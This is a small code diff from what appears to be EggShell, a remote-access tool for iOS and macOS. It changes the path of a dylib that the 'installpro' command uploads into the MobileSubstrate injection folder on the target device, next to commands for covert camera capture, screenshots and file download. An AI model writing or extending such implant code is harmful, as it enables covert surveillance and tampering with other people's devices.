@@ -227,7 +227,7 @@ def initSHELL(name,conn,host,port,CDA):
         if args[0] == "download" or args[0] == "picture" or args[0] == "frontcam" or args[0] == "backcam" or args[0] == "screenshot":
             downloadFile(command,conn)
         elif args[0] == "installpro":
-            uploadFile("resources/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/nespro.dylib",conn)
+            uploadFile("src/binaries/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/nespro.dylib",conn)
         elif args[0] == "help":
             showHelp(CDA)
         elif args[0] == "clear":
